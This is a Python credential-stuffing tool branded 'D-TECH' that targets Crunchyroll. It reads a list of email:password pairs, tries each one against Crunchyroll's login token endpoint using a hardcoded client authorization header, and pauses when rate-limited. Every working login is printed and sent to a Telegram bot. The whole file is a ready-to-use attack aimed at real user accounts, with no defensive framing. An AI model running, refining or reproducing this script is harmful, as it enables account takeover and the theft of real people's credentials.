import requests
import random
import os
import pyfiglet
import time
from user_agent import generate_user_agent
from colorama import Fore, Style, init

# Initialize colorama
init()

# Colors
GREY = Fore.LIGHTBLACK_EX  # Light grey
RED = Fore.RED  # Red
GREEN = Fore.GREEN  # Green
BLUE = Fore.BLUE  # Blue
RESET = Style.RESET_ALL

device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))

# Print single banner
def print_banner(title):
    os.system('clear')
    
    # D-TECH custom banner
    d_tech_banner = pyfiglet.figlet_format("D-TECH", font="slant")
    
    # Display banner with symbols and styles
    print(f"{RED}╔═══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{GREY}{d_tech_banner}{RESET}")
    print(f"{GREEN}                        Reconfigured by preasx24@gmail.com{RESET}")
    print(f"{RED}╚═══════════════════════════════════════════════════════════════════╝{RESET}")
    print(f"{GREEN}{' '*30}>> Github: Preasx24 <<{' '*30}{RESET}\n")
    print(f"{GREEN}{'━'*67}{RESET}")

# Display futuristic animation
def futuristic_animation():
    # A cool loop that displays D-TECH in random positions and colors
    for _ in range(20):
        os.system('clear')
        d_tech = pyfiglet.figlet_format("D-TECH", font=random.choice(["slant", "banner", "digital"]))
        color = random.choice([GREEN, RED, BLUE, GREY])
        print(f"{color}{d_tech}{RESET}")
        time.sleep(0.1)
        
    # Final message before showing results
    print(f"{GREEN}\n{'='*30} SYSTEM SCAN COMPLETE {'='*30}\n{RESET}")
    time.sleep(2)

print_banner('Crunchyroll')

ID = input(f' {BLUE}— YOUR ID: {GREY}')

file_name = input(f' {BLUE}— FILE PATH: {GREY}')
print(f"{GREEN}{'━'*67}{RESET}")
file = open(file_name).read().splitlines()

successful_attempts = []

for xx in file:
    if ":" in xx:
        email = xx.split(':')[0]
        pasw = xx.split(':')[1]

        url = "https://beta-api.crunchyroll.com/auth/v1/token"

        headers = {
            "host": "beta-api.crunchyroll.com",
            "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=",
            "x-datadog-sampling-priority": "0",
            "etp-anonymous-id": "855240b9-9bde-4d67-97bb-9fb69aa006d1",
            "content-type": "application/x-www-form-urlencoded",
            "accept-encoding": "gzip",
            "user-agent": "Crunchyroll/3.59.0 Android/14 okhttp/4.12.0"
        }

        data = {
            "username": email,
            "password": pasw,
            "grant_type": "password",
            "scope": "offline_access",
            "device_id": device_id,
            "device_name": "SM-G9810",
            "device_type": "samsung SM-G955N"
        }

        res = requests.post(url, data=data, headers=headers)

        if "refresh_token" in res.text:
            print(f'{GREEN} [ GOOD ] ☑️  >>>> [ {email} | {pasw} ]{RESET}')
            successful_attempts.append(f"{email}:{pasw}")
            requests.post(f'https://api.telegram.org/bot<YOUR-BOT-TOKEN>/sendMessage?chat_id={ID}&text={email}:{pasw}')

        elif "406 Not Acceptable" in res.text:
            print(f"\n\n{res.text}\n\n")
            print(' Wait 5min ❗')
            time.sleep(300)

        else:
            print(f'{RED} [ ERROR ] ❌ >>>> [ {email} | {pasw} ]{RESET}')
            time.sleep(6)

# Run the futuristic animation before showing the successful attempts
futuristic_animation()

# After the animation, display all successful attempts
if successful_attempts:
    print(f"{GREEN}{'━'*67}{RESET}")
    print(f"{BLUE}    ✨✨ Successful Attempts: ✨✨{RESET}")
    for attempt in successful_attempts:
        print(f"{GREEN} ➤ {attempt} {RESET}")
    print(f"{GREEN}{'━'*67}{RESET}")
else:
    print(f"{RED} No successful attempts found. {RESET}")
